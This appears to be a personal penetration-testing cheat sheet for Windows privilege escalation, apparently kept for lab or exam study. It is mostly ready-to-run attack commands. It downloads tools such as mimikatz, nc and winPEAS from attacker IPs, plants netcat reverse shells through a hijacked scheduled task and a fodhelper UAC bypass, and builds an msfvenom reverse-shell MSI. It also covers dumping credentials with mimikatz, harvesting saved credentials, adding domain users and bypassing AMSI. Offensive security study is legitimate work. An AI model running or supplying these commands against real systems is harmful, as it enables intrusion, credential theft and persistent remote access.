TAGS: #WindowsCommands #Enumeration 

>
>https://sohvaxus.github.io/content/winxp-sp1-privesc.html
>https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/

## * CMD and Powershell commands
```cmd/ps
echo %userdomain% %username%
whoami /priv
whoami /groups
net user
net localgroup
net localgroup administrators
net start
echo $Env:PATH
echo $Env:%PATH% ------#cmd
netstat -ano
```
>Note: copy info from systeminfo, save it to a text file on your machine and use windows exploit suggester on it
```
systeminfo
```
Note: To start and stop services
```cmd
sc start <service name>
sc stop <service name>
```
Note: Checking powershell history
```
type C:\Users\<actual user>\appdata\roaming\microsoft\windows\powershell\psreadline
```

```locating-files
where /R c:/windows file-name
```

## * Saved Windows Credentials
```cmd/ps
1. cmdkey /list

2. runas /savecred /user:admin cmd.exe
```

##### - IIS Configuration
```cmd/ps
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

##### - Retrieve Credentials from Software: Putty
```cmd/ps
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

## * CMD commands
```CMD-only shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
##### - Download files
```
certutil.exe -urlcache -f http://192.168.119.225/SharpHound.exe sh.exe
certutil.exe -urlcache -f http://192.168.119.225/nc.exe nc.exe
certutil.exe -urlcache -f http://192.168.119.225/rev-4441.exe rev.exe
certutil.exe -urlcache -f http://192.168.119.225/mimikatz.exe mm.exe
certutil.exe -urlcache -f http://192.168.119.225/winPEASx86_ofs.exe wp.exe
certutil.exe -urlcache -f http://192.168.45.195/winPEASx64.exe wp1.exe
certutil.exe -urlcache -f http://192.168.45.195/w64agent.exe agent.exe
certutil.exe -urlcache -f http://192.168.45.195/PrintSpoofer32.exe psf.exe

Invoke-WebRequest http://192.168.45.195:8000/mimikatz64.exe mm.exe

curl -o nc.exe http://192.168.45.195:8000/nc64.exe
```

## * Powershell
``` Powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```
#file search
gci -path C:\ -recurse -include "local.txt"
```
##### - Download files
```Powershell
powershell -ep bypass "(New-Object System.Net.WebClient).Downloadfile('http://192.168.119.225/test.aspx')"
```

```Powershell
##### - Reigistry Escalation

```PowerShell
Get-Acl -Path hklm:\System\CurrentControlSet\Services\regsvc | fl
```
## * Unattended Windows Installations: May have creds
```
- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml- 
```

## * Scheduled Task
```Scheduled-Task
## Idea is to check for task running to retrieve detalid information about any of the services
- schtasks
- schtasks /query /tn <task name> /fo list /v

## icacls displays or modifies permissions of a file
- icacls c:\<location of the file that the task is running>

## modifying file the task is running

- C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\<location of the file that the task is running>

```

##### - Startup applications
Note: checking applications in the startup
```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

## * AlwaysInstallElevated
```AlwaysInstallElevated
## Only works, if these 2 regesitry are set:
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

## Generate malicious msi file:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

## Once the file is on the victim machine:
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

```

## * Networking
```
ipconfig /all
netstat -abno
arp -a

```
## * Unquoted Service Paths
```
Examples:
exploitable
C:\Program Files\Common Files\file.exe
Windows will check every part of the pathname for the exe file. Such as: C:\Program.exe, c:\Program Files.exe, c:\Program Files\Common.exe

not exploitable
"C:\Program Files\Common Files\file.exe"
```



### whoami /priv
![[Pasted image 20220909181843.png]]
```
If SeImpersonatePrivilege is enabled, we can possibly use juicy potato to exploit it
```
https://github.com/ohpe/juicy-potato
https://github.com/ohpe/juicy-potato/releases
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato

### Adding Users
```
net user Cyrano cyrano01 /add /domain

### adding users to groups
net group "name of group you want to add user to" /add Cyrano
```
## UAC Bypass Section

### UAC Bypass Methods
```
net use Z: \\127.0.0.1\C$
z:
```

```
Arkham - ippsec
https://youtube.com/watch?v=krC5j1Ab44I&t=3340

google
hfiref0x/UACME github
egre55 UAC bypass
https://egre55.github.io/system-properties-uac-bypass/
```

If user is admin but don't have administrative privileges. If you put in whoami /priv and see below.
Group used for deny only = means you can do a UAC bypass
Check out overgrowncarror github for invoke-bypass.ps1
https://github.com/overgrowncarrot1/Invoke-Bypass
#### UAC bypass with fodhelper
```
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -value "C:\TEMP\nc.exe 10.10.132.141 4455 -e cmd.exe" -Force

New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -PropertyType String -Force

### Then run fodhelper command
fodhelper or fodhelper.exe

```
### mimikatz
`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md`
```
privilege::debug


sekurlsa::logonpasswords
sekurlsa::tickets /export

kerberos::list /export

vault::cred
vault::list

lsadump::sam
lsadump::secrets
lsadump::cache
```


## AMSI Bypass
If we receive the message below in powershell
The script contains malicious content and has been blocked by your antivirus

Check out overgrowncarrot github for scripts/amsi bypass
https://github.com/overgrowncarrot1/Scripts/blob/main/AMSIBypass.txt